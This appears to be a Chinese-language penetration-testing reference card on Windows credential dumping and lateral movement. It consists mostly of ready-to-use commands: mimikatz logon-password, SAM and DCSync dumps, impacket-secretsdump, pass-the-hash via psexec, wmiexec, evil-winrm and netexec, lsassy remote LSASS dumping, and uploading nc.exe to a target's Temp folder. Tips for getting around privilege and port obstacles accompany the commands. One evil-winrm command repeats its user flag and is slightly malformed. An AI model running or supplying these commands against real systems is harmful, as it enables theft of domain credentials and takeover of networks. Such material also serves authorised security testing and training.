---
cmd_type: LatMov
os: windows
tags:
  - cmd
syntax: impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<IP>
---

# 凭据导出与横向移动 (mimikatz secretsdump)

## 适用场景

- 已拿到 Windows 主机管理员/高权限 shell，需要导出内存凭据、SAM、NTDS 哈希。
- 拿到 NTLM hash 后做 Pass-the-Hash 横向移动。
- 域内获取 DCSync 权限后远程 dump 全域 hash。

## 枚举命令

```bash
whoami /priv                        # 查看是否有 SeDebugPrivilege（mimikatz 需要）
net user /domain                    # 枚举域用户
nxc smb <IP>/24                     # 扫描网段存活 SMB 主机（nxc = netexec）
```

## 利用步骤

### 1. mimikatz（目标机上，需管理员 + SeDebugPrivilege）

```bash
# 本地导出登录凭据（明文/缓存）
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
# 导出本地 SAM
mimikatz.exe "privilege::debug" "lsadump::sam" "exit"
# DCSync：在具备复制目录权限的账户上远程 dump 指定用户
mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:<DOMAIN> /user:Administrator" "exit"
```

### 2. impacket-secretsdump

```bash
# 本地：有 SAM/SYSTEM 文件时离线提取
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
# 远程：有本地管理员凭据时
impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<IP>
# DCSync：域账户具备复制权限（-just-dc 只 dump DC 账户，-just-dc-user 指定用户）
impacket-secretsdump -just-dc <DOMAIN>/<USER>:<PASS>@<DC_IP>
impacket-secretsdump -just-dc-user Administrator <DOMAIN>/<USER>:<PASS>@<DC_IP>
```

### 3. Pass-the-Hash（用 NTLM hash 登录，无需明文）

```bash
# impacket-psexec
impacket-psexec -hashes :<NTLM_HASH> <DOMAIN>/<USER>@<IP>
# impacket-wmiexec
impacket-wmiexec -hashes :<NTLM_HASH> <DOMAIN>/<USER>@<IP>
# evil-winrm（默认 5985，-S 走 5986 SSL）
evil-winrm -i <IP> -u <USER> -H <NTLM_HASH>
# nxc smb（netexec）
nxc smb <IP> -u <USER> -H <NTLM_HASH> -x "whoami"
```

### 4. lsassy 远程抓 LSASS + evil-winrm 上传文件

```bash
# lsassy：远程 dump LSASS 凭据（返回 session 中的 hash/密码）
lsassy -d <DOMAIN> -u <USER> -p <PASS> <IP>
# evil-winrm 上传文件（本地上传 -> 目标）
evil-winrm -i <IP> -u <USER> -p <PASS> -u <USER>
upload /local/path/nc.exe C:\Windows\Temp\nc.exe
```

## 常见坑

- mimikatz 需要 `SeDebugPrivilege`（`privilege::debug` 返回 20 即成功），否则 `sekurlsa::logonpasswords` 拿不到结果。
- 新版 Windows 默认不开 WDigest，明文密码拿不到，用 `sekurlsa::logonpasswords` 时留意 NTLM hash 而非明文。
- Pass-the-Hash 只对 NTLM 认证有效，Kerberos-only 环境需用 overpass-the-hash / ticket。
- DCSync 需要 `DS-Replication-Get-Changes` 权限（通常 Domain Admins / 某些委派账户），普通管理员不行。
- 网络层可能挡 5985/445，先用 `nxc smb` 探活确认端口，再决定用 wmiexec 还是 evil-winrm。

## 参考开源项目

- mimikatz — https://github.com/gentilkiwi/mimikatz
- impacket — https://github.com/fortra/impacket
- lsassy — https://github.com/Hackndo/lsassy
- evil-winrm — https://github.com/Hackplayers/evil-winrm
